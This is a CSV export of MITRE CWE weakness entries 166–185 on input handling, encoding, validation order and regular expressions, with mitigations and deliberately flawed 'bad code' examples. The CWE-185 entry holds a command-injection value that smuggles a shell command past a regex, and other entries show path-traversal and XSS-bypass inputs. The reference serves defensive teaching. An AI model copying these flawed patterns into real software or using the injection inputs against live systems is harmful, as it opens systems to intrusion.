CWE-166: Improper Handling of Missing Special Element,"The product receives input from an upstream component, but it does not handle or incorrectly handles when an expected special element is missing.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart, Likelihood: ",无示范例子,"Developers should anticipate that special elements will be removed in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-167: Improper Handling of Additional Special Element,"The product receives input from an upstream component, but it does not handle or incorrectly handles when an additional unexpected special element is provided.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that extra special elements will be injected in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-168: Improper Handling of Inconsistent Special Elements,The product does not properly handle input in which an inconsistency exists between two or more special characters or reserved words.,"Scope: AvailabilityAccess ControlNon-Repudiation, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Bypass Protection Mechanism; Hide Activities, Likelihood: ",无示范例子,"Developers should anticipate that inconsistent special elements will be injected/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE CATEGORY: DEPRECATED: Technology-Specific Special Elements,"This category has been deprecated. It was originally intended as a ""catch-all"" for input validation problems in technologies that did not have their own CWE, but introduces unnecessary depth to the hierarchy.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-170: Improper Null Termination,The product does not terminate or incorrectly terminates a string or array with a null character or equivalent terminator.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Memory; Execute Unauthorized Code or CommandsThe case of an omitted null character is the most dangerous of the possible issues. This will almost certainly result in information disclosure, and possibly a buffer overflow condition, which may be exploited to execute arbitrary code., Likelihood: ; Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Read Memory; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)If a null character is omitted from a string, then most string-copying functions will read data until they locate a null character, even outside of the intended boundaries of the string. This could: cause a crash due to a segmentation fault cause sensitive adjacent memory to be copied and sent to an outsider trigger a buffer overflow when the copy is being written to a fixed-size buffer., Likelihood: ; Scope: IntegrityAvailability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or RestartMisplaced null characters may result in any number of security problems. The biggest issue is a subset of buffer overflow, and write-what-where conditions, where data corruption occurs from the writing of a null character over valid data, or even instructions. A randomly placed null character may put the system into an undefined state, and therefore make it prone to crashing. A misplaced null character may corrupt other data in memory., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Alter Execution Logic; Execute Unauthorized Code or CommandsShould the null character corrupt the process flow, or affect a flag controlling access, it may lead to logical errors which allow for the execution of arbitrary code., Likelihood: ","Example 1The following code reads from cfgfile and copies the input into inputbuf using strcpy(). The code mistakenly assumes that inputbuf will always contain a NULL terminator.(bad code)Example Language:C#define MAXLEN 1024...char *pathbuf[MAXLEN];...read(cfgfile,inputbuf,MAXLEN); //does not null terminatestrcpy(pathbuf,inputbuf); //requires null terminated input...The code above will behave correctly if the data read from cfgfile is null terminated on disk as expected. But if an attacker is able to modify this input so that it does not contain the expected NULL character, the call to strcpy() will continue copying from memory until it encounters an arbitrary NULL character. This will likely overflow the destination buffer and, if the attacker can control the contents of memory immediately following inputbuf, can leave the application susceptible to a buffer overflow attack.Example 2In the following code, readlink() expands the name of a symbolic link stored in pathname and puts the absolute path into buf. The length of the resulting value is then calculated using strlen().(bad code)Example Language:Cchar buf[MAXPATH];...readlink(pathname, buf, MAXPATH);int length = strlen(buf);...The code above will not always behave correctly as readlink() does not append a NULL byte to buf. Readlink() will stop copying characters once the maximum size of buf has been reached to avoid overflowing the buffer, this will leave the value buf not NULL terminated. In this situation, strlen() will continue traversing memory until it encounters an arbitrary NULL character further on down the stack, resulting in a length value that is much larger than the size of string. Readlink() does return the number of bytes copied, but when this return value is the same as stated buf size (in this case MAXPATH), it is impossible to know whether the pathname is precisely that many bytes long, or whether readlink() has truncated the name to avoid overrunning the buffer. In testing, vulnerabilities like this one might not be caught because the unused contents of buf and the memory immediately following it may be NULL, thereby causing strlen() to appear as if it is behaving correctly.Example 3While the following example is not exploitable, it provides a good example of how nulls can be omitted or misplaced, even when ""safe"" functions are used:(bad code)Example Language:C#include <stdio.h>#include <string.h>int main() {char longString[] = ""String signifying nothing"";char shortString[16];strncpy(shortString, longString, 16);printf(""The last character in shortString is: %c (%1$x)\n"", shortString[15]);return (0);}The above code gives the following output: ""The last character in shortString is: n (6e)"". So, the shortString array does not end in a NULL character, even though the ""safe"" string function strncpy() was used. The reason is that strncpy() does not impliciitly add a NULL character at the end of the string when the source is equal in length or longer than the provided size.","Phase:  RequirementsUse a language that is not susceptible to these issues. However, be careful of null byte interaction errors (CWE-626) with lower-level constructs that may be written in a language that is susceptible.Phase:  ImplementationEnsure that all string functions used are understood fully as to how they append null characters. Also, be wary of off-by-one errors when appending nulls to the end of strings.Phase:  ImplementationIf performance constraints permit, special code can be added that validates null-termination of string buffers, this is a rather naive and error-prone solution.Phase:  ImplementationSwitch to bounded string manipulation functions. Inspect buffer lengths involved in the buffer overrun trace reported with the defect.Phase:  ImplementationAdd code that fills buffers with nulls (however, the length of buffers still needs to be inspected, to ensure that the non null-terminated string is not written at the physical end of the buffer)."
"CWE CATEGORY: DEPRECATED: Cleansing, Canonicalization, and Comparison Errors","This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree. Weaknesses in this category were related to improper handling of data within protection mechanisms that attempt to perform neutralization for untrusted data. These weaknesses can be found in other similar categories.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-172: Encoding Error,"The product does not properly encode or decode the data, resulting in unexpected values.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-173: Improper Handling of Alternate Encoding,The product does not properly handle when an input uses an alternate encoding that is valid for the control sphere to which the input is being sent.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-174: Double Decoding of the Same Data,"The product decodes the same input twice, which can limit the effectiveness of any protection mechanism that occurs in between the decoding operations.","Scope: Access ControlConfidentialityAvailabilityIntegrityOther, Impact: Technical Impact:Bypass Protection Mechanism; Execute Unauthorized Code or Commands; Varies by Context, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-175: Improper Handling of Mixed Encoding,The product does not properly handle when the same input uses several different (mixed) encodings.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-176: Improper Handling of Unicode Encoding,The product does not properly handle when an input contains Unicode encoding.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1Windows provides the MultiByteToWideChar(), WideCharToMultiByte(), UnicodeToBytes(), and BytesToUnicode() functions to convert between arbitrary multibyte (usually ANSI) character strings and Unicode (wide character) strings. The size arguments to these functions are specified in different units, (one in bytes, the other in characters) making their use prone to error.In a multibyte character string, each character occupies a varying number of bytes, and therefore the size of such strings is most easily specified as a total number of bytes. In Unicode, however, characters are always a fixed size, and string lengths are typically given by the number of characters they contain. Mistakenly specifying the wrong units in a size argument can lead to a buffer overflow.The following function takes a username specified as a multibyte string and a pointer to a structure for user information and populates the structure with information about the specified user. Since Windows authentication uses Unicode for usernames, the username argument is first converted from a multibyte string to a Unicode string.(bad code)Example Language:Cvoid getUserInfo(char *username, struct _USER_INFO_2 info){WCHAR unicodeUser[UNLEN+1];MultiByteToWideChar(CP_ACP, 0, username, -1, unicodeUser, sizeof(unicodeUser));NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info);}This function incorrectly passes the size of unicodeUser in bytes instead of characters. The call to MultiByteToWideChar() can therefore write up to (UNLEN+1)*sizeof(WCHAR) wide characters, or (UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR) bytes, to the unicodeUser array, which has only (UNLEN+1)*sizeof(WCHAR) bytes allocated.If the username string contains more than UNLEN characters, the call to MultiByteToWideChar() will overflow the buffer unicodeUser.","Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-177: Improper Handling of URL Encoding (Hex Encoding),The product does not properly handle when all or part of an input has been URL encoded.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-178: Improper Handling of Case Sensitivity,"The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent:(bad code)Example Language:Javapublic String preventXSS(String input, String mask) {return input.replaceAll(""script"", mask);}The code only works when the ""script"" tag is in all lower-case, forming an incomplete denylist (CWE-184). Equivalent tags such as ""SCRIPT"" or ""ScRiPt"" will not be neutralized by this method, allowing an XSS attack.","Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-179: Incorrect Behavior Order: Early Validation,"The product validates input before applying protection mechanisms that modify the input, which could allow an attacker to bypass the validation via dangerous inputs that only arise after the modification.","Scope: Access ControlIntegrity, Impact: Technical Impact:Bypass Protection Mechanism; Execute Unauthorized Code or CommandsAn attacker could include dangerous input that bypasses validation protection mechanisms which can be used to launch various attacks including injection attacks, execute arbitrary code or cause other unintended behavior., Likelihood: ","Example 1The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string ""/safe_dir/"".(bad code)Example Language:JavaString path = getInputPath();if (path.startsWith(""/safe_dir/"")){File f = new File(path);return f.getCanonicalPath();}The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of ""/safe_dir/../"" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just ""/"".To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue.(good code)Example Language:JavaString path = getInputPath();File f = new File(path);if (f.getCanonicalPath().startsWith(""/safe_dir/"")){return f.getCanonicalPath();}Example 2This script creates a subdirectory within a user directory and sets the user as the owner.(bad code)Example Language:PHPfunction createDir($userName,$dirName){$userDir = '/users/'. $userName;if(strpos($dirName,'..') !== false){echo 'Directory name contains invalid sequence';return;}//filter out '~' because other scripts identify user directories by this prefix$dirName = str_replace('~','',$dirName);$newDir = $userDir . $dirName;mkdir($newDir, 0700);chown($newDir,$userName);}While the script attempts to screen for '..' sequences, an attacker can submit a directory path including "".~."", which will then become "".."" after the filtering step. This allows a Path Traversal (CWE-21) attack to occur.",Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-180: Incorrect Behavior Order: Validate Before Canonicalize,"The product validates input before it is canonicalized, which prevents the product from detecting data that becomes invalid after the canonicalization step.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string ""/safe_dir/"".(bad code)Example Language:JavaString path = getInputPath();if (path.startsWith(""/safe_dir/"")){File f = new File(path);return f.getCanonicalPath();}The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of ""/safe_dir/../"" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just ""/"".To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue.(good code)Example Language:JavaString path = getInputPath();File f = new File(path);if (f.getCanonicalPath().startsWith(""/safe_dir/"")){return f.getCanonicalPath();}",Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-181: Incorrect Behavior Order: Validate Before Filter,"The product validates data before it has been filtered, which prevents the product from detecting data that becomes invalid after the filtering step.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1This script creates a subdirectory within a user directory and sets the user as the owner.(bad code)Example Language:PHPfunction createDir($userName,$dirName){$userDir = '/users/'. $userName;if(strpos($dirName,'..') !== false){echo 'Directory name contains invalid sequence';return;}//filter out '~' because other scripts identify user directories by this prefix$dirName = str_replace('~','',$dirName);$newDir = $userDir . $dirName;mkdir($newDir, 0700);chown($newDir,$userName);}While the script attempts to screen for '..' sequences, an attacker can submit a directory path including "".~."", which will then become "".."" after the filtering step. This allows a Path Traversal (CWE-21) attack to occur.",Phases:  Implementation; Architecture and DesignInputs should be decoded and canonicalized to the application's current internal representation before being filtered.
CWE-182: Collapse of Data into Unsafe Value,"The product filters data in a way that causes it to be reduced or ""collapsed"" into an unsafe value that violates an expected security property.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Input ValidationAvoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.Canonicalize the name to match that of the file system's representation of the name. This can sometimes be achieved with an available API (e.g. in Win32 the GetFullPathName function)."
CWE-183: Permissive List of Allowed Inputs,"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are explicitly allowed by policy because the inputs are assumed to be safe, but the list is too permissive - that is, it allows an input that is unsafe, leading to resultant weaknesses.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-184: Incomplete List of Disallowed Inputs,"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are not allowed by policy or otherwise require other action to neutralize before additional processing takes place, but the list is incomplete, leading to resultant weaknesses.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following code attempts to stop XSS attacks by removing all occurences of ""script"" in an input string.(bad code)Example Language:Javapublic String removeScriptTags(String input, String mask) {return input.replaceAll(""script"", mask);}Because the code only checks for the lower-case ""script"" string, it can be easily defeated with upper-case script tags.","Phase:  ImplementationStrategy:  Input ValidationDo not rely exclusively on detecting disallowed inputs. There are too many variants to encode a character, especially when different environments are used, so there is a high likelihood of missing some variants. Only use detection of disallowed inputs as a mechanism for detecting suspicious activity. Ensure that you are using other protection mechanisms that only identify ""good"" input - such as lists of allowed inputs - and ensure that you are properly encoding your outputs."
CWE-185: Incorrect Regular Expression,The product specifies a regular expression in a way that causes data to be improperly matched or compared.,"Scope: Other, Impact: Technical Impact:Unexpected State; Varies by ContextWhen the regular expression is not correctly specified, data might have a different format or type than the rest of the program expects, producing resultant weaknesses or errors., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIn PHP, regular expression checks can sometimes be bypassed with a null byte, leading to any number of weaknesses., Likelihood: ","Example 1The following code takes phone numbers as input, and uses a regular expression to reject invalid phone numbers.(bad code)Example Language:Perl$phone = GetPhoneNumber();if ($phone =~ /\d+-\d+/) {# looks like it only has hyphens and digitssystem(""lookup-phone $phone"");}else {error(""malformed number!"");}An attacker could provide an argument such as: ""; ls -l ; echo 123-456"" This would pass the check, since ""123-456"" is sufficient to match the ""\d+-\d+"" portion of the regular expression.Example 2This code uses a regular expression to validate an IP string prior to using it in a call to the ""ping"" command.(bad code)Example Language:Pythonimport subprocessimport redef validate_ip_regex(ip: str):ip_validator = re.compile(r""((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}"")if ip_validator.match(ip):return ipelse:raise ValueError(""IP address does not match valid pattern."")def run_ping_regex(ip: str):validated = validate_ip_regex(ip)# The ping command treats zero-prepended IP addresses as octalresult = subprocess.call([""ping"", validated])print(result)Since the regular expression does not have anchors (CWE-777), i.e. is unbounded without ^ or $ characters, then prepending a 0 or 0x to the beginning of the IP address will still result in a matched regex pattern. Since the ping command supports octal and hex prepended IP addresses, it will use the unexpectedly valid IP address (CWE-1389). For example, ""0x63.63.63.63"" would be considered equivalent to ""99.63.63.63"". As a result, the attacker could potentially ping systems that the attacker cannot reach directly.","Phase:  Architecture and DesignStrategy:  RefactoringRegular expressions can become error prone when defining a complex language even for those experienced in writing grammars. Determine if several smaller regular expressions simplify one large regular expression. Also, subject the regular expression to thorough testing techniques such as equivalence partitioning, boundary value analysis, and robustness. After testing and a reasonable confidence level is achieved, a regular expression may not be foolproof. If an exploit is allowed to slip through, then record the exploit and refactor the regular expression."
